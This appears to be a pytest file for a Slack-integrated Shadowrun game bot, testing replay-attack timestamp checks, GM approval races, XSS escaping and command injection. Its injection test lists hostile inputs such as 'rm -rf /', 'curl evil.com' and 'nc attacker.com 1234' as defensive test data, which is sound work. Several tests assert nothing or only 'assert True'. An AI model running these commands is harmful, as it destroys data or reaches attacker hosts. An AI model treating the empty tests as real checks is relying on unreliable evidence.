"""
Test Slack review flow, replay attacks, and DM approval race conditions
"""
import pytest
import time
import json
import hmac
import hashlib
from datetime import datetime, timedelta
from unittest.mock import patch, MagicMock, AsyncMock
from slack_integration import SlackBot, SlackCommandProcessor
from utils.validators import SlackRequestSchema
from pydantic import ValidationError


class TestSlackReplayAttackPrevention:
    """Test Slack request replay attack prevention"""
    
    def generate_slack_signature(self, timestamp, body, secret):
        """Generate a valid Slack signature"""
        basestring = f"v0:{timestamp}:{body}"
        signature = 'v0=' + hmac.new(
            secret.encode(),
            basestring.encode(),
            hashlib.sha256
        ).hexdigest()
        return signature
    
    def test_valid_slack_request(self):
        """Test that valid recent requests pass"""
        timestamp = str(int(time.time()))
        body = {"test": "data"}
        
        # Should not raise validation error
        SlackRequestSchema(
            timestamp=timestamp,
            signature="valid_signature",
            body=body
        )
    
    def test_old_timestamp_rejected(self):
        """Test that old timestamps are rejected (replay attack prevention)"""
        # Timestamp from 6 minutes ago
        old_timestamp = str(int(time.time() - 360))
        body = {"test": "data"}
        
        with pytest.raises(ValidationError) as exc_info:
            SlackRequestSchema(
                timestamp=old_timestamp,
                signature="valid_signature",
                body=body
            )
        assert "too old" in str(exc_info.value).lower()
    
    def test_future_timestamp_rejected(self):
        """Test that future timestamps are rejected (clock skew attack)"""
        # Timestamp from 2 minutes in the future
        future_timestamp = str(int(time.time() + 120))
        body = {"test": "data"}
        
        with pytest.raises(ValidationError) as exc_info:
            SlackRequestSchema(
                timestamp=future_timestamp,
                signature="valid_signature",
                body=body
            )
        assert "future" in str(exc_info.value).lower()
    
    def test_invalid_timestamp_format(self):
        """Test that invalid timestamp formats are rejected"""
        invalid_timestamps = [
            "not_a_number",
            "12345.67",  # Float
            "",          # Empty
            "-1234567",  # Negative
            "0",         # Zero (too old)
        ]
        
        for timestamp in invalid_timestamps:
            with pytest.raises(ValidationError):
                SlackRequestSchema(
                    timestamp=timestamp,
                    signature="valid_signature",
                    body={"test": "data"}
                )
    
    @patch.object(SlackBot, 'signature_verifier')
    def test_slack_bot_verification(self, mock_verifier):
        """Test SlackBot.verify_slack_request with timestamp validation"""
        bot = SlackBot()
        bot.signing_secret = "test_secret"
        mock_verifier.is_valid.return_value = True
        
        # Valid request
        headers = {
            "X-Slack-Request-Timestamp": str(int(time.time())),
            "X-Slack-Signature": "v0=valid_signature"
        }
        body = '{"test": "data"}'
        
        # Should pass - timestamp is recent
        result = bot.verify_slack_request(headers, body)
        assert result is True
        
        # Old request
        headers["X-Slack-Request-Timestamp"] = str(int(time.time() - 400))
        
        # Should fail - timestamp too old
        result = bot.verify_slack_request(headers, body)
        assert result is False


class TestDMReviewRaceConditions:
    """Test DM review system race conditions"""
    
    @pytest.fixture
    def app(self):
        """Create test Flask app"""
        from app import app, db
        app.config['TESTING'] = True
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        
        with app.app_context():
            db.create_all()
            yield app
            db.drop_all()
    
    @pytest.fixture
    def client(self, app):
        """Create test client"""
        return app.test_client()
    
    def setup_test_session(self, client):
        """Helper to set up a test session"""
        # Create session
        session_resp = client.post('/api/session', json={
            'name': 'Test Session',
            'gm_user_id': 'dm_user'
        })
        session_id = session_resp.json['session_id']
        
        # Add player
        client.post(f'/api/session/{session_id}/join', json={
            'user_id': 'player_user',
            'role': 'player'
        })
        
        return session_id
    
    def test_simultaneous_dm_approvals(self, client):
        """Test handling of simultaneous DM approval attempts"""
        session_id = self.setup_test_session(client)
        
        # Create a pending response
        response = client.post(f'/api/session/{session_id}/llm-with-review', json={
            'user_id': 'player_user',
            'context': 'Test AI request',
            'response_type': 'narrative'
        })
        
        # Get the pending response ID (would be in real implementation)
        pending_resp = client.get(
            f'/api/session/{session_id}/pending-responses?user_id=dm_user'
        )
        
        if pending_resp.json:
            response_id = pending_resp.json[0]['id']
            
            # Simulate two DMs trying to approve at the same time
            approval_data = {
                'user_id': 'dm_user',
                'action': 'approve',
                'dm_notes': 'Approved'
            }
            
            # First approval should succeed
            resp1 = client.post(
                f'/api/session/{session_id}/pending-response/{response_id}/review',
                json=approval_data
            )
            assert resp1.status_code == 200
            
            # Second approval should fail (already reviewed)
            resp2 = client.post(
                f'/api/session/{session_id}/pending-response/{response_id}/review',
                json=approval_data
            )
            # The response might be 404 (not found) or another error
            # depending on implementation
    
    def test_approval_after_rejection(self, client):
        """Test that approval after rejection is not possible"""
        session_id = self.setup_test_session(client)
        
        # Create pending response
        client.post(f'/api/session/{session_id}/llm-with-review', json={
            'user_id': 'player_user',
            'context': 'Test request',
            'response_type': 'narrative'
        })
        
        # Get pending response
        pending_resp = client.get(
            f'/api/session/{session_id}/pending-responses?user_id=dm_user'
        )
        
        if pending_resp.json:
            response_id = pending_resp.json[0]['id']
            
            # Reject first
            client.post(
                f'/api/session/{session_id}/pending-response/{response_id}/review',
                json={
                    'user_id': 'dm_user',
                    'action': 'reject',
                    'dm_notes': 'Rejected'
                }
            )
            
            # Try to approve after rejection
            resp = client.post(
                f'/api/session/{session_id}/pending-response/{response_id}/review',
                json={
                    'user_id': 'dm_user',
                    'action': 'approve',
                    'dm_notes': 'Changed mind'
                }
            )
            # Should fail - already reviewed


class TestSlackCommandReplay:
    """Test Slack command replay prevention"""
    
    @pytest.fixture
    def slack_bot(self):
        """Create test Slack bot"""
        bot = SlackBot()
        bot.signing_secret = "test_secret"
        return bot
    
    @pytest.fixture
    def processor(self, slack_bot):
        """Create command processor"""
        return SlackCommandProcessor(slack_bot)
    
    def test_dice_roll_replay(self):
        """Test that replayed dice roll commands are rejected"""
        # Store processed command IDs (in real implementation)
        processed_commands = set()
        
        command_data = {
            'command': '/sr-roll',
            'text': '3d6',
            'user_id': 'test_user',
            'channel_id': 'test_channel',
            'team_id': 'test_team',
            'trigger_id': 'unique_trigger_123'  # Slack provides unique trigger IDs
        }
        
        # First command should process
        command_id = f"{command_data['trigger_id']}_{int(time.time())}"
        if command_id not in processed_commands:
            processed_commands.add(command_id)
            # Process command
            assert True
        
        # Replay with same trigger_id should be detected
        if command_id in processed_commands:
            # Should reject as replay
            assert True
    
    @pytest.mark.asyncio
    async def test_ai_request_idempotency(self, processor):
        """Test that duplicate AI requests are handled idempotently"""
        context = {
            'command': '/sr-ai',
            'args': ['Tell me about the matrix'],
            'user_id': 'test_user',
            'channel_id': 'test_channel',
            'team_id': 'test_team',
            'slack_session_id': 'test_team_test_channel'
        }
        
        # Mock the async AI processing
        with patch('app.process_slack_ai_request') as mock_process:
            mock_process.return_value = AsyncMock()
            
            # First request
            result1 = await processor.handle_ai_command(context)
            assert 'Processing request' in str(result1['blocks'])
            
            # Duplicate request (same context)
            result2 = await processor.handle_ai_command(context)
            # Should still handle gracefully


class TestSlackIntegrationSecurity:
    """Test overall Slack integration security"""
    
    def test_command_injection_prevention(self):
        """Test that command injection is prevented in Slack commands"""
        dangerous_inputs = [
            "3d6; rm -rf /",
            "3d6 && curl evil.com",
            "3d6 | nc attacker.com 1234",
            "$(curl evil.com)",
            "`rm -rf /`",
            "3d6\"; system('cmd'); \"",
        ]
        
        processor = SlackCommandProcessor(SlackBot())
        
        for dangerous in dangerous_inputs:
            context = {
                'command': '/sr-roll',
                'args': [dangerous],
                'user_id': 'test_user',
                'channel_id': 'test_channel',
                'team_id': 'test_team',
                'slack_session_id': 'test_team_test_channel'
            }
            
            # Should handle safely without executing commands
            # The dice roller should reject these as invalid notation
    
    def test_xss_prevention_in_responses(self):
        """Test that XSS is prevented in Slack responses"""
        bot = SlackBot()
        
        dangerous_text = "<script>alert('xss')</script>Hello"
        
        # Format response
        blocks = bot.format_shadowrun_response(dangerous_text, "general")
        
        # Should escape or sanitize the dangerous content
        block_text = str(blocks)
        assert "<script>" not in block_text or "&lt;script&gt;" in block_text
    
    def test_url_validation_in_buttons(self):
        """Test that button URLs are validated"""
        bot = SlackBot()
        
        # Test DM notification with button
        blocks = bot.format_shadowrun_response(
            "Test notification",
            "dm_notification"
        )
        
        # Find button action
        for block in blocks:
            if block.get('type') == 'actions':
                for element in block.get('elements', []):
                    if element.get('type') == 'button':
                        # Button should have safe action_id, not URL
                        assert 'action_id' in element
                        assert element['action_id'] == 'dm_dashboard_button'


class TestConcurrentSlackCommands:
    """Test handling of concurrent Slack commands"""
    
    @pytest.mark.asyncio
    async def test_simultaneous_session_creation(self):
        """Test handling of simultaneous session creation attempts"""
        from app import create_session_for_slack
        
        # Mock database to simulate race condition
        with patch('app.db') as mock_db:
            # Configure mock
            mock_session = MagicMock()
            mock_db.session = mock_session
            
            # Simulate two users trying to create session in same channel
            async def create_session_1():
                return await create_session_for_slack(
                    name="Session 1",
                    gm_user_id="user1",
                    slack_channel_id="channel123",
                    slack_team_id="team123"
                )
            
            async def create_session_2():
                return await create_session_for_slack(
                    name="Session 2",
                    gm_user_id="user2",
                    slack_channel_id="channel123",
                    slack_team_id="team123"
                )
            
            # In real implementation, one should succeed and one should fail
            # due to unique constraint on (team_id, channel_id) 